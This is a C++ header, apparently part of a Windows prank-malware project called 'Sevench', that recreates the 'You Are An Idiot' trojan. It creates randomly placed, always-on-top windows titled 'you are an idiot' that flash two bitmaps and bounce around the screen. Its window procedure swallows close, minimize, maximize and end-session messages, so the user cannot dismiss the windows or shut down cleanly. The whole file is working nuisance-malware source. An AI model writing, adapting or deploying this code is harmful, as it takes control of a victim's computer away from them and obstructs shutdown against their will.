#pragma once

#include "Sevench.h"

HBITMAP whbmp1 = (HBITMAP)LoadImageW(0, L"YAAI.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
HBITMAP whbmp2 = (HBITMAP)LoadImageW(0, L"IAAY.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);

LRESULT WINAPI IdiotWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_CLOSE:
	case WM_QUERYENDSESSION:
		return 0;
	case WM_SYSCOMMAND:
		if (wParam == SC_MINIMIZE || wParam == SC_MAXIMIZE)
			return 0;
		break;
	default:
		break;
	}

	return DefWindowProcW(hwnd, msg, wParam, lParam);
}

DTHREAD(YAAIUpdate)
{
	HWND hwnd = (HWND)param;

	HDC whdc = GetDC(hwnd), whdcMem = CreateCompatibleDC(0);
	int wi = 3;
	bool wff = false;

	bool bncX = true, bncY = true;

	while (true)
	{
		wi++;
		if (wi >= 4)
		{
			SelectObject(whdcMem, wff ? whbmp2 : whbmp1);
			BitBlt(whdc, 0, 0, 320, 180, whdcMem, 0, 0, SRCCOPY);

			wi = 0;
			wff = !wff;
		}

		RECT rc;
		GetWindowRect(hwnd, &rc);

		int a = (GetSystemMetrics(SM_CXSCREEN) + GetSystemMetrics(SM_CYSCREEN)) / 2 / 30;

		if (bncX)
		{
			if (bncY)
			{
				SetWindowPos(hwnd, 0, rc.left + a, rc.top + a, 320, 205, SWP_ASYNCWINDOWPOS | SWP_NOZORDER | SWP_SHOWWINDOW);
			}
			else
			{
				SetWindowPos(hwnd, 0, rc.left + a, rc.top - a, 320, 205, SWP_ASYNCWINDOWPOS | SWP_NOZORDER | SWP_SHOWWINDOW);
			}
		}
		else
		{
			if (bncY)
			{
				SetWindowPos(hwnd, 0, rc.left - a, rc.top + a, 320, 205, SWP_ASYNCWINDOWPOS | SWP_NOZORDER | SWP_SHOWWINDOW);
			}
			else
			{
				SetWindowPos(hwnd, 0, rc.left - a, rc.top - a, 320, 205, SWP_ASYNCWINDOWPOS | SWP_NOZORDER | SWP_SHOWWINDOW);
			}
		}

		SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);

		if (rc.right >= GetSystemMetrics(SM_CXSCREEN))
			bncX = false;
		if (rc.bottom >= GetSystemMetrics(SM_CYSCREEN))
			bncY = false;

		if (rc.left <= 0)
			bncX = true;
		if (rc.top <= 0)
			bncY = true;

		Sleep(100);
	}
}

DTHREAD(YAAIWindow)
{
	WNDCLASS wc = { };
	wc.lpfnWndProc = IdiotWindowProc;
	wc.lpszClassName = L"AX1337-SEVENCH-YAAI";

	RegisterClassW(&wc);

	HWND hwnd = CreateWindowExW(WS_EX_TOOLWINDOW | WS_EX_TOPMOST, L"AX1337-SEVENCH-YAAI", L"you are an idiot",
		WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
		Random() % GetSystemMetrics(SM_CXSCREEN), Random() % GetSystemMetrics(SM_CYSCREEN),
		320, 205, 0, 0, 0, 0);

	if (!hwnd)
		return 0;

	ShowWindow(hwnd, SW_SHOW);
	PTHREAD(YAAIUpdate, hwnd);

	MSG msg = { };

	while (GetMessageW(&msg, 0, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
}